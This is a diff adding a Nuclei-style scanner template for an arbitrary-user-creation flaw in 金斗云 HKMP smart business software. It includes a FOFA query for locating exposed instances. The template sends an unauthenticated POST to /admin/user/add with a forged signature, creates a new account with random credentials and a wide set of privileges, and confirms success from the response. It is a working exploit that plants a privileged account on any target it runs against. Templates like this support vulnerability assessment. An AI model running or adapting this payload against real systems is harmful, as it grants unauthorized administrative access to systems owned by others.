@@ -1,0 +1,37 @@
+id: poc-yaml-kingtowin-add-anyuser-add
+info:
+  name: 金斗云-HKMP智慧商业软件 add 任意用户添加漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  metadata:
+    product: 金斗云-HKMP
+    fofa-query: body="金斗云 HKMP"
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{rand_text_alphanumeric(4)}}"
+  t3: "{{rand_text_alphanumeric(8)}}"
+
+http:
+  - method: POST
+    path:
+      - "/admin/user/add"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":2287791269,"sign":"hkmp","data":{"userCode":"{{t1}}","userName":"{{t2}}","password":"{{t3}}","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"fbdfa10658"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"1000\""
+          - "用户添加成功"
+      - type: word
+        part: header
+        words:
+          - "application/json"
